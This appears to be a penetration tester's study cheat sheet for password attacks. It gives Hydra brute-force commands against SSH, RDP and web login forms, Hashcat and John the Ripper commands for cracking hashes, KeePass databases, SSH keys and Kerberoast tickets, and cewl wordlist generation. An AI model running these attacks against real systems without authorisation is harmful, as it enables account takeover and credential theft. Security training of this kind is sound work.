### Check for default credentials
- Google default credentials for the application (duh)
- `grep -r $searchTerm /usr/share/seclists`

### Hydra
- `hydra -l $username -P /usr/share/wordlists/rockyou.txt -s $alternatePort ssh://$IP`
- `hydra -L /usr/share/wordlists/dirb/others/names.txt -p "$password" rdp://$IP
- Web page example 1:`hydra -l $user -P /usr/share/wordlists/rockyou.txt $IP http-post-form " /index.php:fm_usr=user&fm_pwd=\^PASS^:Login failed. Invalid"`
- Web page example 2: `hydra -l '$username' -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt $IP http-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect"`
	- -`"$loginpage:$parameters:$failMessage$"`
- Basic Auth: `hydra -l admin -P /usr/share/wordlists/rockyou.txt $URL http-get`
- `hydra -L $userlist -p $pass -s 8081 $IP http-post-form '/$path:username=^USER64^&password=^PASS64^:Incorrect'`
	- where -s is for alternate ports, like 8081 and the USER and PASS are base64 encoded
- `hydra -l $user -P $passlist 'http-post-form://192.168.198.61:8081/$path$:username=^USER64^&password=^PASS64^:C=/:F=403'` 
	- Where failure is indicate by 403 error
- Notes:
	- To get Hydra to base64 each item in a list, add a 64 after the USER and PASS variables. (^USER64^ and ^PASS64^)

### Hashcat
- `hashcat -m 0 $hashfile /usr/share/wordlists/rockyou.txt -r 15222.rule --force --show`
- `hashcat -m 13400 $keepassHashFile /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show`
- check hashcat for which mode to use (searching for KeePass in this case)
	- `hashcat --help | grep -i "KeePass"`
	- `hashcat -h | grep -i "ssh"`

### john the ripper
- `ssh2john id_rsa > ssh.hash` 
- `keepass2john name.kdbx > keepass1.hash`
- `john --format=krb5tgs sql_svc.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt`

### Misc
- If you're using Burp Intruder for anything, make sure to go to options to set custom error message and follow redirects
- There is http-get-form and https-post-form
- Can create a wordlist from a web page using `cewl`
	- `cewl -d -m 3 $URL -w $output.txt`
		- d = depth, m = minimum letters
	- `cewl $URL > pass`
	- `cewl --lowercase $URL`
- Generate a username list from names: https://github.com/jseidl/usernamer